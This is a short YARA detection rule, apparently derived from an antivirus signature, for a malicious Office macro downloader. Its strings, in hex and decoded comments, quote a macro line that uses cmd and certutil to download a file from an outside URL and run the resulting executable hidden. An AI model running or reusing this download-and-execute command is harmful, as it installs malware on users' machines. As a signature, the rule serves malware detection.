
rule TrojanDownloader_O97M_Powdow_OPD_MTB{
	meta:
		description = "TrojanDownloader:O97M/Powdow.OPD!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,02 00 02 00 02 00 00 "
		
	strings :
		$a_01_0 = {3d 20 53 68 65 6c 6c 28 22 63 6d 64 20 2f 63 20 63 65 72 74 75 74 69 6c 2e 65 78 65 20 2d 75 72 6c 63 61 63 68 65 20 2d 73 70 6c 69 74 20 2d 66 20 22 22 68 74 74 70 73 3a 2f 2f 67 72 65 65 6e 6c 61 62 65 67 2e 63 6f 6d 2f 41 78 77 79 68 6e 73 63 6d 2e 63 6f 6d 22 } //1 = Shell("cmd /c certutil.exe -urlcache -split -f ""https://greenlabeg.com/Axwyhnscm.com"
		$a_01_1 = {2e 65 78 65 2e 65 78 65 20 26 26 20 53 73 72 73 74 69 62 73 79 67 7a 6f 62 6a 76 69 6a 63 64 75 2e 65 78 65 2e 65 78 65 22 2c 20 76 62 48 69 64 65 29 } //1 .exe.exe && Ssrstibsygzobjvijcdu.exe.exe", vbHide)
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1) >=2
 
}